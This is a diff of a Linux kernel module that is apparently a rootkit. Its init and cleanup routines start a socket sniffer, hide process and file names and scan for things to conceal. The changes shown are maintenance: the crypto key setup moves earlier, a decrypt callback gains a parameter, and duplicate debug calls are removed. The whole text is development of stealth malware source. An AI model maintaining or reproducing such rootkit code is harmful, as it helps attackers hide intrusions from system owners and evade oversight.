@@ -68,7 +68,6 @@ static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 
-
 //XXX debug
 static struct kv_crypto_st *kvmgc0, *kvmgc1;
 
@@ -802,6 +801,10 @@ static int __init kv_init(void) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
 cont:
 #endif
+    /** Init crypto engine */
+    kv_crypto_key_init();
+
+
     tsk_sniff = kv_sock_start_sniff();
     if (!tsk_sniff)
         goto unroll_init;
@@ -822,9 +825,6 @@ cont:
     fs_add_name_ro(kv_get_hide_ps_names(), 0);
 
     kv_scan_and_hide();
-
-    /** Init crypto engine */
-    kv_crypto_key_init();
 
     /** debug */
     kvmgc0 =crypto_init();
@@ -879,7 +879,7 @@ leave:
 }
 
 /** example decrypt */
-void _decrypt_callback(const u8 * const buf, size_t buflen, void *userdata) {
+void _decrypt_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
     if (userdata) {
         char *name = (char*)userdata;
         prinfo("Called from: '%s'\n", name);
@@ -887,6 +887,7 @@ void _decrypt_callback(const u8 * const buf, size_t buflen, void *userdata) {
     print_hex_dump(KERN_DEBUG, "decrypted text: ",
             DUMP_PREFIX_NONE, 16, 1, buf, buflen, true);
 }
+
 static void __exit kv_cleanup(void) {
     decrypt_callback cb = (decrypt_callback)_decrypt_callback;
 
@@ -913,8 +914,6 @@ static void __exit kv_cleanup(void) {
     fs_names_cleanup();
 
     /** debug */
-    kv_decrypt(kvmgc0, cb, "debug: kvmgc0");
-    kv_decrypt(kvmgc1, cb, "debug: kvmgc1");
     kv_decrypt(kvmgc0, cb, "debug: kvmgc0");
     kv_decrypt(kvmgc1, cb, "debug: kvmgc1");
 
